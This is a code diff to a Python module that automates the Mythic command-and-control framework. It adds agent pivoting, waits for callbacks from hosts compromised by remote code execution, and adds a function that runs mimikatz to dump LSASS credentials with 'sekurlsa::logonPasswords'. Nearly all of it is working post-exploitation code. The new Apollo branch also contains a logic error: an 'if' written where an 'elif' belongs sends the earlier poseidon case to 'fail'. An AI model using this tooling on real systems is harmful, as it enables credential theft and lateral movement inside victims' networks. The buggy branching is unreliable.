@@ -2,13 +2,13 @@
 Module that handles all responsibilities related
 to working with Mythic C2
 """
-# from app.core.config import get_settings
-from mythic import mythic
-
 import os
 import socket
-from dotenv import load_dotenv
 from typing import List
+
+from mythic import mythic
+from dotenv import load_dotenv
+# from app.core.config import get_settings
 
 
 mythic_instance = None
@@ -111,6 +111,9 @@ async def c2_pivoting_agent(lport, display_id, agent_type) -> str:
         # poseidon_tcp C2 P2P
         command_name = "link_tcp"
         parameters = f"0.0.0.0 {lport}"
+    if agent_type == "apollo":
+        command_name = "link"
+        parameters = f"0.0.0.0 {lport}"
     else:
         return "fail"
     # not in function because just task
@@ -122,10 +125,16 @@ async def c2_pivoting_agent(lport, display_id, agent_type) -> str:
     return status
 
 
-async def init_agent():
-    """ get payload uuid and agent_name, return os, status, display_id """
-    # we init only one agent at time, not parallel
-    pass
+async def get_agent_callback(rhost):
+    """ get os, status, display_id of new callback,
+        you must run payload after this func or with timeout """
+    # payload is delivered and start by user cuz diversity of RCE
+    async for c in mythic.subscribe_new_callbacks(
+        mythic=mythic_instance, batch_size=1
+    ):
+        if c[0]['external_ip'] == rhost:
+            return c[0]['os'], 'success', c[0]['display_id']
+    return "linux", "fail", 1
 
 
 async def check_status(callback_display_id: int) -> str:
@@ -145,8 +154,7 @@ async def check_status(callback_display_id: int) -> str:
     if has_id:
         return "success"
     # maybe add elif based on time
-    else:
-        return "fail"
+    return "fail"
 
 
 async def get_payload_ids(callback_display_id):
@@ -172,8 +180,8 @@ async def get_payload_ids(callback_display_id):
     payload = callback.get("payload")
     if payload:
         return payload.get("id"), payload.get("uuid")
-    else:
-        return 1, "00000000-0000-0000-0000-000000000000"
+    # default null
+    return 1, "00000000-0000-0000-0000-000000000000"
 
 
 async def execute_local_command(cmd, callback_display_id: int, timeout=500):
@@ -209,3 +217,16 @@ async def execute_agent_command_o(
     mythic_p_id, mythic_p_uuid = await get_payload_ids(callback_display_id)
 
     return str(output), mythic_p_id, mythic_p_uuid
+
+
+async def mimikatz_on_agent(display_id, agent_type):
+    """ run mimikatz from agent to dump LSASS, mostly for agent pivoting """
+    if agent_type == "apollo":
+        raw_output, i, u = await execute_agent_command_o(
+            cmd="mimikatz",
+            params="""-Command "sekurlsa::minidump C:\\Temp\\ls.dmp" """
+                   """ "sekurlsa::logonPasswords" """,
+            callback_display_id=display_id
+            )
+        # todo extract and check hashes from dmp
+        return raw_output, i, u
